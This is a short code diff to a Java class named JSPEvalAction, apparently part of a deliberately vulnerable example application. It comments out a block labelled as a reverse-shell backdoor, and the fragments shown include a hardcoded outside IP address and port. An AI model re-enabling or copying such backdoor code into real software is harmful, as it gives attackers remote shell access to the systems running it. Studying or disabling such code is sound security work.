@@ -58,7 +58,7 @@ public class JSPEvalAction extends ExampleAction {
 				// END MALICIOUS CODE
 
 				// BEGIN BACKDOOR (REVERSE SHELL) CODE
-				
+				/*
 				try {
 		                   String host = "39.234.101.45";
 		                   int port = 9999;
@@ -93,7 +93,7 @@ public class JSPEvalAction extends ExampleAction {
 		                   s.close();
 				}
 				catch (Throwable t) {}
-				
+				*/
 				// END BACKDOOR (REVERSE SHELL) CODE
 				
 				if (writer != null)
